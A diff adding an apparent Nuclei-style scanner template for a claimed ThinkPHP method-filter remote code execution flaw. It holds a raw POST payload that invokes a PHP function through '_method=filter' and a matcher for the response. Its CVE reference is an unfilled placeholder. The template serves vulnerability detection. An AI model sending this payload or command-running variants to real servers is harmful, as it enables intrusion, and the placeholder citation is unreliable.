@@ -1,0 +1,27 @@
+id: thinkphp_method_filter_code_exec
+
+info:
+  name: "ThinkPHP Method Filter 组件远程代码执行漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    The method_filter component in ThinkPHP framework contains a remote code execution flaw. Attackers can exploit this vulnerability by submitting specially crafted payloads to execute arbitrary code on the target system. 
+      
+      reference: 
+        - https://nvd.nist.gov/vuln/detail/CVE-2023-XXXXX
+  tags: ThinkPHP
+
+http:
+- raw:
+  - |
+    POST /index.php?s=index/index/index HTTP/1.1
+    Host: {{Hostname}}
+
+    c=var_dump&f=4e5e5d7364f443e28fbf0d3ae744a59a&_method=filter
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '4e5e5d7364f443e28fbf0d3ae744a59a'
+    - 'var_dump'
